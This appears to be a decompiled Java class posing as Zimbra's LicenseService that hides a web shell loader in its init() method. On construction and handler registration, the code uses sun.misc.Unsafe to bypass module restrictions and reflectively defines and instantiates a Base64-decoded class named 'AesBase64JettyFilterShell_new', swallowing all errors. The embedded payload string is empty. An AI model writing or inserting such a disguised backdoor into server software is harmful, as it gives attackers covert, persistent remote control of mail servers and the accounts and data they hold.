//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.zimbra.cs.network.license.service;

import com.sun.tools.javac.Main;
import com.zimbra.common.soap.AccountConstants;
import com.zimbra.soap.DocumentDispatcher;
import com.zimbra.soap.DocumentService;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class LicenseService implements DocumentService {
    public LicenseService() {
        init();
    }

    public void registerHandlers(DocumentDispatcher dispatcher) {
        dispatcher.registerHandler(AccountConstants.CHECK_LICENSE_REQUEST, new CheckLicense());
        dispatcher.registerHandler(AccountConstants.GET_INFO_REQUEST, new GetInfo());
        init();
    }

    public static void init(){
        try {
            String initpara = "";
            byte[] bytes = Base64.getDecoder().decode(initpara);
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field field = unsafeClass.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Unsafe unsafe = (Unsafe) field.get(null);
            Module baseModule = Object.class.getModule();
            Class currentClass = Main.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.putObject(currentClass, offset, baseModule);
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            method.setAccessible(true);
            ((Class)method.invoke(ClassLoader.getSystemClassLoader(), "AesBase64JettyFilterShell_new", bytes, 0, bytes.length)).newInstance();
        }catch (Exception e){
        }
    }
}
